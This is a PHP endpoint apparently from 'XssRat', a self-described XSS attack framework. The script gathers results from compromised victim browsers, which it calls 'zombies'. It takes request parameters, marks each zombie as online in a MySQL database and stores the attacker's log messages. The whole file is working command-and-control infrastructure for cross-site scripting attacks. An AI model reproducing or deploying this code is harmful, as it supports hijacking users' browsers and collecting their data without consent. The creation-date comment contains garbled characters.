<?php
/* 
 * Created on 2014��4��7��
 * @project XssRat
 * @author owlinrye
 * @email blackrat.sec@gmail.com
 * An easy Xss framework
 * 
 * get result from client
 */
 
header("Content-Type: application/javascript; charset=UTF-8");
require_once("../bin/Path.php"); 
require_once(PHP_BASE_DIR."/db/MySQL.php");
require_once(PHP_BASE_DIR."/util/util.php");
require_once(PHP_BASE_DIR."/entity/ProjectModuleData.php");
require_once(PHP_BASE_DIR."/entity/AttackLog.php");


function quotes($content){
	if(get_magic_quotes_gpc()){
		if(is_array($content)){
			foreach($content as $key=>$value){
				$content[$key] = stripslashes($value);
			}
		}else{
			$content = stripslashes($content);}
	}else{}
	return $content;
}

$res = "{}";

if (!empty($_REQUEST["i"])&&$_REQUEST["i"]!=="null"&&$_REQUEST["i"]!=="undefined"&&!empty($_REQUEST["t"])&&!empty($_REQUEST["l"])){

	$ticket = $_REQUEST["t"];
	$logMsg = $_REQUEST["l"];
	$pmd_id = $_REQUEST["i"];
	
	$db = new MySQL($log);
	
	
	if($mysqli = $db->openDB()){
		$pmd = new ProjectModuleData($mysqli,$log);
		$attackLog = new AttackLog($mysqli,$log);
		//如果 pmd_id 已存在
		if(!$pmd->updateStatus($pmd_id,1)){//更新客户端状态信息为在线
			$log->error("update zombie status failed!");
		}
		if($attackLog -> insertLog($pmd_id,quotes($logMsg))){
			$res = "{}";
		}
		$db->closeDB();		
	}else{
		$log->error("Open database connection failed!");
	}

}

echo $res;

?>
